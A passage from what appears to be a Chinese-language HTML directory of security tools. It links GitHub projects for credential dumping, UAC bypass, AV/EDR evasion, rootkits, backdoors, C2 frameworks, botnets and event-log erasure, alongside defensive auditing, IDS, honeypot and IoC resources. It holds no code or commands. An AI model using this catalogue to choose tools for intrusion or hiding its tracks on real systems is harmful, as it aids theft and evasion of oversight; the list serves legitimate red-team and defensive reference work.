<li><a class="reference external" href="https://github.com/sensepost/ruler">ruler</a> A tool to abuse Exchange services</li>
<li><a class="reference external" href="https://github.com/dafthack/MailSniper">MailSniper</a></li>
<li><a class="reference external" href="https://github.com/dirkjanm/PrivExchange">PrivExchange</a>  Exchange your privileges for Domain Admin privs by abusing Exchange</li>
</ul>
</div>
<div class="section" id="powershell">
<h4>PowerShell<a class="headerlink" href="#powershell" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/PowerShellMafia">PowerShellMafia</a></li>
</ul>
</div>
<div class="section" id="id6">
<h4>内网信息收集<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/djhohnstein/SharpShares">SharpShares</a> Quick and dirty binary to list network share information from all machines in the current domain and if they're readable</li>
<li><a class="reference external" href="https://github.com/nccgroup/WinShareEnum">WinShareEnum</a> Windows Share Enumerator</li>
<li><a class="reference external" href="https://github.com/moonD4rk/HackBrowserData">HackBrowserData</a> 全平台的浏览器数据导出工具</li>
</ul>
</div>
<div class="section" id="kerberos">
<h4>Kerberos<a class="headerlink" href="#kerberos" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/GhostPack/Rubeus">Rubeus</a></li>
<li><a class="reference external" href="https://github.com/ropnop/kerbrute">kerbrute</a> A tool to perform Kerberos pre-auth bruteforcing</li>
</ul>
</div>
<div class="section" id="id7">
<h4>自动化审计<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/guardicore/monkey">Infection Monkey</a> Data center Security Testing Tool</li>
</ul>
</div>
<div class="section" id="id8">
<h4>绕过<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/jthuraisamy/SysWhispers">SysWhispers</a> AV/EDR evasion via direct system calls</li>
<li><a class="reference external" href="https://github.com/jthuraisamy/SysWhispers2">SysWhispers2</a> AV/EDR evasion via direct system calls</li>
<li><a class="reference external" href="https://github.com/outflanknl/Dumpert">Dumpert</a> LSASS memory dumper using direct system calls and API unhooking</li>
</ul>
</div>
<div class="section" id="id9">
<h4>内网扫描<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/inbug-team/InScan">InScan</a> 边界打点后的自动化渗透工具</li>
<li><a class="reference external" href="https://github.com/shadow1ng/fscan">fscan</a> 一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。</li>
</ul>
</div>
</div>
<span id="document-tools/ospersistence"></span><div class="section" id="id1">
<h3>操作系统持久化<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="windows">
<h4>Windows<a class="headerlink" href="#windows" title="永久链接至标题">¶</a></h4>
<div class="section" id="id2">
<h5>凭证获取<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></li>
<li><a class="reference external" href="https://github.com/0x09AL/RdpThief">RdpThief</a> Extracting Clear Text Passwords from mstsc.exe using API Hooking</li>
<li><a class="reference external" href="https://github.com/quarkslab/quarkspwdump">quarkspwdump</a> Dump various types of Windows credentials without injecting in any process</li>
<li><a class="reference external" href="https://github.com/GhostPack/SharpDump">SharpDump</a> C# port of PowerSploit's Out-Minidump.ps1 functionality</li>
</ul>
</div>
<div class="section" id="id3">
<h5>权限提升<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/abatchy17/WindowsExploits">WindowsExploits</a></li>
<li><a class="reference external" href="https://github.com/GTFOBins/GTFOBins.github.io">GTFOBins</a> Curated list of Unix binaries that can be exploited to bypass system security restrictions</li>
<li><a class="reference external" href="https://github.com/411Hall/JAWS">JAWS</a> Just Another Windows (Enum) Script</li>
</ul>
</div>
<div class="section" id="uac-bypass">
<h5>UAC Bypass<a class="headerlink" href="#uac-bypass" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/rootm0s/WinPwnage">WinPwnage</a> UAC bypass, Elevate, Persistence and Execution methods</li>
<li><a class="reference external" href="https://github.com/hfiref0x/UACME">UACME</a> Defeating Windows User Account Control</li>
<li><a class="reference external" href="https://github.com/sailay1996/UAC_Bypass_In_The_Wild">UAC Bypass In The Wild</a></li>
</ul>
</div>
<div class="section" id="id4">
<h5>免杀<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/secretsquirrel/SigThief">SigThief</a> Stealing Signatures and Making One Invalid Signature at a Time</li>
</ul>
</div>
<div class="section" id="c2">
<h5>C2<a class="headerlink" href="#c2" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/cobbr/SharpSploit">SharpSploit</a> .NET post-exploitation library written in C#</li>
<li><a class="reference external" href="https://github.com/zerosum0x0/koadic">Koadic</a> is a Windows post-exploitation rootkit</li>
</ul>
</div>
<div class="section" id="id5">
<h5>隐藏<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/M00nRise/ProcessHider">ProcessHider</a> Post-exploitation tool for hiding processes from monitoring applications</li>
<li><a class="reference external" href="https://github.com/hlldz/Invoke-Phant0m">Invoke Phant0m</a> Windows Event Log Killer</li>
<li><a class="reference external" href="https://github.com/QAX-A-Team/EventCleaner">EventCleaner</a> A tool mainly to erase specified records from Windows event logs, with additional functionalities</li>
</ul>
</div>
<div class="section" id="dll">
<h5>DLL注入<a class="headerlink" href="#dll" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/monoxgas/sRDI">sRDI</a> Shellcode Reflective DLL Injection</li>
</ul>
</div>
<div class="section" id="rootkit">
<h5>rootkit<a class="headerlink" href="#rootkit" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/bytecode77/r77-rootkit">r77-rootkit</a> Ring 3 rootkit with single file installer and fileless persistence that hides processes, files, network connections, etc</li>
</ul>
</div>
<div class="section" id="id6">
<h5>伪造<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/countercept/ppid-spoofing">parent PID spoofing</a> Scripts for performing and detecting parent PID spoofing</li>
<li><a class="reference external" href="https://github.com/py7hagoras/GetSystem">GetSystem</a> This is a C# implementation of making a process/executable run as NT AUTHORITY/SYSTEM. This is achieved through parent ID spoofing of almost any SYSTEM process.</li>
</ul>
</div>
<div class="section" id="mitm">
<h5>MiTM<a class="headerlink" href="#mitm" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/SySS-Research/Seth">Seth</a> Perform a MitM attack and extract clear text credentials from RDP connections</li>
<li><a class="reference external" href="https://github.com/GoSecure/pyrdp">pyrdp</a> RDP man-in-the-middle (mitm) and library for Python with the ability to watch connections live or after the fact</li>
</ul>
</div>
<div class="section" id="id7">
<h5>综合工具<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/samratashok/nishang">Nishang</a> Offensive PowerShell for red team, penetration testing and offensive security</li>
</ul>
</div>
</div>
<div class="section" id="linux">
<h4>Linux<a class="headerlink" href="#linux" title="永久链接至标题">¶</a></h4>
<div class="section" id="id8">
<h5>权限提升<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/mzet-/linux-exploit-suggester">linux exploit suggester</a></li>
<li><a class="reference external" href="https://github.com/rebootuser/LinEnum">LinEnum</a> Scripted Local Linux Enumeration &amp; Privilege Escalation Checks</li>
<li><a class="reference external" href="https://github.com/ngalongc/AutoLocalPrivilegeEscalation">AutoLocalPrivilegeEscalation</a></li>
</ul>
</div>
<div class="section" id="id9">
<h5>rootkit<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/nurupo/rootkit">rootkit</a></li>
<li><a class="reference external" href="https://github.com/m0nad/Diamorphine">Diamorphine</a> LKM rootkit for Linux Kernels 2.6.x/3.x/4.x/5.x (x86/x86_64 and ARM64)</li>
</ul>
</div>
<div class="section" id="id11">
<h5>后门<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/andreafabrizi/prism">prism</a> is an user space stealth reverse shell backdoor</li>
<li><a class="reference external" href="https://github.com/inquisb/icmpsh">icmpsh</a> Simple reverse ICMP shell</li>
</ul>
</div>
</div>
<div class="section" id="id12">
<h4>综合<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h4>
<div class="section" id="id13">
<h5>凭证获取<a class="headerlink" href="#id13" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/mthbernardes/sshLooterC">sshLooterC</a> program to steal passwords from ssh</li>
<li><a class="reference external" href="https://github.com/juuso/keychaindump">keychaindump</a> A proof-of-concept tool for reading OS X keychain passwords</li>
<li><a class="reference external" href="https://github.com/AlessandroZ/LaZagne">LaZagne</a> Credentials recovery project</li>
<li><a class="reference external" href="https://github.com/deepfence/SecretScanner">SecretScanner</a> Find secrets and passwords in container images and file systems</li>
</ul>
</div>
<div class="section" id="id14">
<h5>权限提升<a class="headerlink" href="#id14" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/AlessandroZ/BeRoot">BeRoot</a> Privilege Escalation Project - Windows / Linux / Mac</li>
</ul>
</div>
<div class="section" id="rat">
<h5>RAT<a class="headerlink" href="#rat" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/quasar/QuasarRAT">QuasarRAT</a></li>
</ul>
</div>
<div class="section" id="id15">
<h5>C2<a class="headerlink" href="#id15" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/EmpireProject/Empire">Empire</a></li>
<li><a class="reference external" href="https://github.com/n1nj4sec/pupy">pupy</a></li>
<li><a class="reference external" href="https://github.com/cobbr/Covenant">Covenant</a> is a collaborative .NET C2 framework for red teamers</li>
<li><a class="reference external" href="https://github.com/Rvn0xsy/Cooolis-ms">Cooolis-ms</a> 包含了Metasploit Payload Loader、Cobalt Strike External C2 Loader、Reflective DLL injection的代码执行工具</li>
</ul>
</div>
<div class="section" id="dns-shell">
<h5>DNS Shell<a class="headerlink" href="#dns-shell" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/sensepost/DNS-Shell">DNS Shell</a> DNS-Shell is an interactive Shell over DNS channel</li>
<li><a class="reference external" href="https://github.com/ahhh/Reverse_DNS_Shell">Reverse DNS Shell</a> A python reverse shell that uses DNS as the c2 channel</li>
</ul>
</div>
<div class="section" id="cobalt-strike">
<h5>Cobalt Strike<a class="headerlink" href="#cobalt-strike" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://www.cobaltstrike.com">Cobalt Strike</a></li>
<li><a class="reference external" href="https://github.com/gloxec/CrossC2">CrossC2</a> generate CobaltStrike's cross-platform payload</li>
<li><a class="reference external" href="https://github.com/timwhitez/Cobalt-Strike-Aggressor-Scripts">Cobalt Strike Aggressor Scripts</a></li>
</ul>
</div>
<div class="section" id="id18">
<h5>日志清除<a class="headerlink" href="#id18" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/Rizer0/Log-killer">Log killer</a> Clear all logs in [linux/windows] servers</li>
</ul>
</div>
<div class="section" id="botnet">
<h5>Botnet<a class="headerlink" href="#botnet" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/malwaredllc/byob">byob</a> Build Your Own Botnet</li>
</ul>
</div>
<div class="section" id="id19">
<h5>免杀工具<a class="headerlink" href="#id19" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/1y0n/AV_Evasion_Tool">AV Evasion Tool</a> 掩日 - 免杀执行器生成工具</li>
<li><a class="reference external" href="https://github.com/Mr-Un1k0d3r/DKMC">DKMC</a> Dont kill my cat - Malicious payload evasion tool</li>
</ul>
</div>
</div>
</div>
<span id="document-tools/aduit"></span><div class="section" id="id1">
<h3>审计工具<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>通用<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/FeeiCN/cobra">Cobra</a></li>
<li><a class="reference external" href="https://github.com/Semmle/ql">Semmle QL</a></li>
<li><a class="reference external" href="https://github.com/CoatiSoftware/Sourcetrail">Sourcetrail</a> free and open-source cross-platform source explorer</li>
<li><a class="reference external" href="https://github.com/knqyf263/trivy">trivy</a> A Simple and Comprehensive Vulnerability Scanner for Containers, Suitable for CI</li>
<li><a class="reference external" href="http://www.fortify.net/">fortify</a></li>
</ul>
</div>
<div class="section" id="php">
<h4>PHP<a class="headerlink" href="#php" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="http://rips-scanner.sourceforge.net/">RIPS</a></li>
<li><a class="reference external" href="https://github.com/fate0/prvd">prvd</a></li>
<li><a class="reference external" href="https://github.com/OneSourceCat/phpvulhunter">phpvulhunter</a></li>
<li><a class="reference external" href="https://github.com/phith0n/chip">chip</a> a simple tool to detect potential security threat in php code</li>
</ul>
</div>
<div class="section" id="python">
<h4>Python<a class="headerlink" href="#python" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/shengqi158/pyvulhunter">pyvulhunter</a></li>
<li><a class="reference external" href="https://github.com/python-security/pyt">pyt</a></li>
</ul>
</div>
<div class="section" id="java">
<h4>Java<a class="headerlink" href="#java" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/find-sec-bugs/find-sec-bugs">find sec bugs</a></li>
<li><a class="reference external" href="https://github.com/JackOfMostTrades/gadgetinspector">Gadget Inspector</a>  A byte code analyzer for finding deserialization gadget chains in Java applications</li>
</ul>
</div>
<div class="section" id="javascript">
<h4>JavaScript<a class="headerlink" href="#javascript" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/ajinabraham/NodeJsScan">NodeJsScan</a></li>
</ul>
</div>
<div class="section" id="id3">
<h4>供应链<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/DependencyTrack/dependency-track">Dependency-Track</a> is an intelligent Supply Chain Component Analysis platform that allows organizations to identify and reduce risk from the use of third-party and open source components</li>
</ul>
</div>
</div>
<span id="document-tools/defense"></span><div class="section" id="id1">
<h3>防御<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>日志检查<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon">Sysmon</a></li>
<li><a class="reference external" href="http://www.nirsoft.net/utils/computer_activity_view.html">LastActivityView</a></li>
<li><a class="reference external" href="https://sourceforge.net/projects/regshot/">Regshot</a></li>
<li><a class="reference external" href="https://github.com/kitabisa/teler">teler</a> Real-time HTTP Intrusion Detection</li>
</ul>
</div>
<div class="section" id="id3">
<h4>终端监控<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/yarox24/attack_monitor">attack monitor</a> Endpoint detection &amp; Malware analysis software</li>
<li><a class="reference external" href="https://github.com/BinaryDefense/artillery">artillery</a> The Artillery Project is an open-source blue team tool designed to protect Linux and Windows operating systems through multiple methods.</li>
<li><a class="reference external" href="https://github.com/paypal/yurita">yurita</a> Anomaly detection framework &#64; PayPal</li>
<li><a class="reference external" href="https://github.com/crowdsecurity/crowdsec">crowdsec</a> An open-source, lightweight agent to detect and respond to bad behaviours</li>
</ul>
</div>
<div class="section" id="xss">
<h4>XSS防护<a class="headerlink" href="#xss" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/leizongmin/js-xss">js xss</a></li>
<li><a class="reference external" href="https://github.com/cure53/DOMPurify">DOMPurify</a></li>
<li><a class="reference external" href="https://csp-evaluator.withgoogle.com/">google csp evaluator</a></li>
</ul>
</div>
<div class="section" id="id4">
<h4>配置检查<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/microsoft/AttackSurfaceAnalyzer">Attack Surface Analyzer</a> analyze operating system's security configuration for changes during software installation.</li>
<li><a class="reference external" href="https://github.com/yandex/gixy">gixy</a> Nginx 配置检查工具</li>
<li><a class="reference external" href="https://github.com/cr0hn/dockerscan">dockerscan</a> Docker security analysis &amp; hacking tools</li>
</ul>
</div>
<div class="section" id="id5">
<h4>安全检查<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/CISOfy/lynis">lynis</a> Security auditing tool for Linux, macOS, and UNIX-based systems</li>
<li><a class="reference external" href="https://github.com/rfxn/linux-malware-detect">linux malware detect</a></li>
</ul>
</div>
<div class="section" id="ids">
<h4>IDS<a class="headerlink" href="#ids" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/ossec/ossec-hids">ossec</a></li>
<li><a class="reference external" href="https://github.com/ysrc/yulong-hids">yulong</a></li>
<li><a class="reference external" href="https://github.com/DianrongSecurity/AgentSmith-HIDS">AgentSmith</a></li>
<li><a class="reference external" href="https://github.com/bytedance/ByteDance-HIDS">ByteDance HIDS</a> Cloud-Native Host-Based Intrusion Detection</li>
</ul>
</div>
<div class="section" id="siem">
<h4>SIEM<a class="headerlink" href="#siem" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/panther-labs/panther">panther</a> Detect threats with log data and improve cloud security posture</li>
</ul>
</div>
<div class="section" id="id6">
<h4>威胁情报<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://threatfeeds.io/">threatfeeds</a></li>
<li><a class="reference external" href="https://www.abuseipdb.com/">abuseipdb</a></li>
</ul>
</div>
<div class="section" id="apt">
<h4>APT<a class="headerlink" href="#apt" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://docs.google.com/spreadsheets/d/1H9_xaxQHpWaa4O_Son4Gx0YOIzlcBWMsdvePFX68EKU/pubhtml">APT Groups and Operations</a></li>
<li><a class="reference external" href="https://github.com/kbandla/APTnotes">APTnotes</a></li>
<li><a class="reference external" href="https://github.com/ahmedkhlief/APT-Hunter">APT Hunter</a> Threat Hunting tool for windows event logs which made by purple team mindset to provide detect APT movements hidden in the sea of windows event logs to decrease the time to uncover suspicious activity</li>
</ul>
</div>
<div class="section" id="id7">
<h4>入侵检查<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://www.huorong.cn/">huorong</a></li>
<li><a class="reference external" href="http://www.chkrootkit.org">check rootkit</a></li>
<li><a class="reference external" href="http://rkhunter.sourceforge.net/">rootkit hunter</a></li>
<li><a class="reference external" href="http://www.xuetr.com/">PC Hunter</a></li>
<li><a class="reference external" href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">autoruns</a></li>
</ul>
</div>
<div class="section" id="id8">
<h4>进程查看<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">Process Explorer</a></li>
<li><a class="reference external" href="https://processhacker.sourceforge.io/">ProcessHacker</a></li>
</ul>
</div>
<div class="section" id="waf">
<h4>Waf<a class="headerlink" href="#waf" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/nbs-system/naxsi">naxsi</a></li>
<li><a class="reference external" href="https://github.com/SpiderLabs/ModSecurity">ModSecurity</a></li>
<li><a class="reference external" href="https://github.com/loveshell/ngx_lua_waf">ngx_lua_waf</a></li>
<li><a class="reference external" href="https://github.com/titansec/OpenWAF">OpenWAF</a></li>
</ul>
</div>
<div class="section" id="id9">
<h4>病毒在线查杀<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://www.virustotal.com/">virustotal</a></li>
<li><a class="reference external" href="http://www.virscan.org">virscan</a></li>
<li><a class="reference external" href="https://habo.qq.com">habo</a></li>
</ul>
</div>
<div class="section" id="webshell">
<h4>WebShell查杀<a class="headerlink" href="#webshell" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="http://www.d99net.net/index.asp">D盾</a></li>
<li><a class="reference external" href="http://edr.sangfor.com.cn/backdoor_detection.html">深信服WebShell查杀</a></li>
<li><a class="reference external" href="https://github.com/nbs-system/php-malware-finder">php malware finder</a></li>
</ul>
</div>
<div class="section" id="ioc">
<h4>规则 / IoC<a class="headerlink" href="#ioc" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/eset/malware-ioc">malware ioc</a></li>
<li><a class="reference external" href="https://github.com/fireeye/iocs">fireeye public iocs</a></li>
<li><a class="reference external" href="https://github.com/Neo23x0/signature-base">signature base</a></li>
<li><a class="reference external" href="https://github.com/Yara-Rules/rules">yara rules</a></li>
<li><a class="reference external" href="https://github.com/fireeye/capa-rules">capa rules</a> standard collection of rules for capa</li>
<li><a class="reference external" href="https://github.com/ptresearch/AttackDetection">AttackDetection</a> Suricata PT Open Ruleset</li>
<li><a class="reference external" href="https://github.com/StrangerealIntel/DailyIOC">DailyIOC</a> IOC from articles, tweets for archives</li>
</ul>
</div>
<div class="section" id="id11">
<h4>内存取证<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="http://edr.sangfor.com.cn/tool/SfabAntiBot_X64.7z">SfAntiBotPro</a></li>
<li><a class="reference external" href="https://github.com/volatilityfoundation/volatility">volatility</a></li>
</ul>
</div>
<div class="section" id="security-advisories">
<h4>Security Advisories<a class="headerlink" href="#security-advisories" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://httpd.apache.org/security/">Apache httpd Security Advisories</a></li>
<li><a class="reference external" href="https://lucene.apache.org/solr/security.html">Apache Solr</a></li>
<li><a class="reference external" href="https://tomcat.apache.org/security-8.html">Apache Tomcat</a></li>
<li><a class="reference external" href="https://www.eclipse.org/jetty/documentation/current/security-reports.html">Jetty Security Reports</a></li>
<li><a class="reference external" href="http://nginx.org/en/security_advisories.html">Nginx Security Advisories</a></li>
<li><a class="reference external" href="https://www.openssl.org/news/vulnerabilities.html">OpenSSL</a></li>
</ul>
</div>
<div class="section" id="security-tracker">
<h4>Security Tracker<a class="headerlink" href="#security-tracker" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://security-tracker.debian.org/tracker/source-package/nginx">Nginx Security Tracker</a></li>
</ul>
</div>
<div class="section" id="id12">
<h4>匹配工具<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/VirusTotal/yara">yara</a> The pattern matching swiss knife</li>
<li><a class="reference external" href="https://github.com/fireeye/capa">capa</a> The FLARE team's open-source tool to identify capabilities in executable files.</li>
</ul>
</div>
<div class="section" id="dos">
<h4>DoS防护<a class="headerlink" href="#dos" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><cite>Gatekeeper &lt;https://github.com/AltraMayor/gatekeeper&gt;`_</cite> open-source DDoS protection system</li>
</ul>
</div>
</div>
<span id="document-tools/sdl"></span><div class="section" id="id1">
<h3>安全开发<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>风险控制<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/momosecurity/aswan">aswan</a> 陌陌风控系统静态规则引擎</li>
</ul>
</div>
<div class="section" id="id3">
<h4>静态分析<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/squizlabs/PHP_CodeSniffer">PHP CodeSniffer</a> tokenizes PHP files and detects violations of a defined set of coding standards</li>
</ul>
</div>
<div class="section" id="id4">
<h4>安全编码规范<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/momosecurity/rhizobia_J">JAVA安全SDK及编码规范</a></li>
<li><a class="reference external" href="https://github.com/momosecurity/rhizobia_P">PHP安全SDK及编码规范</a></li>
</ul>
</div>
<div class="section" id="id5">
<h4>漏洞管理<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/martinzhou2015/SRCMS">SRCMS</a></li>
<li><a class="reference external" href="https://github.com/creditease-sec/insight">洞察</a> 宜信集应用系统资产管理、漏洞全生命周期管理、安全知识库管理三位一体的平台</li>
<li><a class="reference external" href="https://github.com/ysrc/xunfeng">xunfeng</a> 适用于企业内网的漏洞快速应急，巡航扫描系统</li>
<li><a class="reference external" href="https://github.com/DefectDojo/django-DefectDojo">DefectDojo</a> an open-source application vulnerability correlation and security orchestration tool</li>
<li><a class="reference external" href="https://github.com/jeffzh3ng/Fuxi-Scanner">Fuxi Scanner</a> Penetration Testing Platform</li>
<li><a class="reference external" href="https://gitee.com/gy071089/SecurityManageFramwork">SeMF</a> 企业内网安全管理平台，包含资产管理，漏洞管理，账号管理，知识库管、安全扫描自动化功能模块</li>
</ul>
</div>
<div class="section" id="devsecops">
<h4>DevSecOps<a class="headerlink" href="#devsecops" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/ztosec/hunter">hunter</a> 中通DevSecOps闭环方案，被动式漏洞扫描器</li>
</ul>
</div>
</div>
<span id="document-tools/operation"></span><div class="section" id="id1">
<h3>运维<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>流量<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://www.bro.org/">Bro</a></li>
<li><a class="reference external" href="https://github.com/aol/moloch">Moloch</a>  Large scale, open source, indexed packet capture and search</li>
<li><a class="reference external" href="https://github.com/simsong/tcpflow">TCPFlow</a></li>
<li><a class="reference external" href="http://www.tcpdump.org/">TCPDump</a></li>
<li><a class="reference external" href="https://www.wireshark.org">WireShark</a></li>
<li><a class="reference external" href="https://github.com/salesforce/Argus">Argus</a></li>
<li><a class="reference external" href="https://github.com/seladb/PcapPlusPlus">PcapPlusPlus</a></li>
<li><a class="reference external" href="https://github.com/jpr5/ngrep">ngrep</a></li>
<li><a class="reference external" href="https://github.com/cisco/joy">cisco joy</a>  A package for capturing and analyzing network flow data and intraflow data, for network research, forensics, and security monitoring.</li>
<li><a class="reference external" href="https://github.com/SecureAuthCorp/impacket">impacket</a> is a collection of Python classes for working with network protocols</li>
<li><a class="reference external" href="https://github.com/nfstream/nfstream">NFStream</a> a Flexible Network Data Analysis Framework</li>
<li><a class="reference external" href="https://github.com/odedshimon/BruteShark">BruteShark</a> Network Analysis Tool</li>
</ul>
</div>
<div class="section" id="id3">
<h4>堡垒机<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/jumpserver/jumpserver">jumpserver</a></li>
<li><a class="reference external" href="https://github.com/triaquae/CrazyEye">CrazyEye</a></li>
<li><a class="reference external" href="https://github.com/liftoff/GateOne">GateOne</a></li>
</ul>
</div>
<div class="section" id="id4">
<h4>蜜罐<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/DinoTools/dionaea">Dionaea</a></li>
<li><a class="reference external" href="https://github.com/threatstream/mhn">Modern Honey Network</a></li>
<li><a class="reference external" href="https://github.com/micheloosterhof/cowrie">Cowrie</a> SSH/Telnet蜜罐</li>
<li><a class="reference external" href="https://github.com/omererdem/honeything">honeything</a> IoT蜜罐</li>
<li><a class="reference external" href="http://conpot.org/">ConPot</a> 工控设施蜜罐</li>
<li><a class="reference external" href="https://github.com/Plazmaz/MongoDB-HoneyProxy">MongoDB HoneyProxy</a></li>
<li><a class="reference external" href="https://github.com/jordan-wright/elastichoney">ElasticHoney</a></li>
<li><a class="reference external" href="https://github.com/secureworks/dcept">DCEPT</a></li>
<li><a class="reference external" href="https://github.com/thinkst/canarytokens">Canarytokens</a></li>
<li><a class="reference external" href="http://bruteforcelab.com/honeydrive">Honeydrive</a></li>
<li><a class="reference external" href="https://github.com/dtag-dev-sec/tpotce/">T-Pot</a> The All In One Honeypot Platform</li>
<li><a class="reference external" href="https://github.com/p1r06u3/opencanary_web">opencanary</a></li>
<li><a class="reference external" href="https://github.com/hacklcx/HFish">HFish</a></li>
<li><a class="reference external" href="https://github.com/desaster/kippo">kippo</a> SSH Honeypot</li>
</ul>
</div>
<div class="section" id="vpn-install">
<h4>VPN Install<a class="headerlink" href="#vpn-install" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/viljoviitanen/setup-simple-pptp-vpn">pptp</a></li>
